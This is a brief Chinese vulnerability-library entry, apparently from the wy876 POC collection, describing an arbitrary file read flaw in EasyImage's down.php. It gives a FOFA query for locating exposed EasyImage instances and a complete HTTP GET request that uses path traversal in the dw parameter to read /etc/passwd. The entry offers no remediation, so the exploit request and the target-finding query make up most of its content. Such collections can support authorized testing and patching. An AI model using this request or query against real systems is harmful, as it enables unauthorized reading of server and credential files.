---
fofa: "app="
source: "wy876 漏洞文库"
---

# EasyImage down.php 任意文件读取漏洞

# 一、漏洞简介
EasyImage：一个简洁的开源图床程序，支持多文件上传,简单无数据库,返回图片url,markdown,bbscode,html的一款图床程序。EasyImage down.php处存在任意文件读取漏洞。

# 二、影响版本
+ EasyImage

# 三、资产测绘
+ fofa`app="EasyImage-简单图床"`
+ 特征


# 四、漏洞复现
```plain
GET /application/down.php?dw=../../../etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xvk2q1dxwph2krte>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
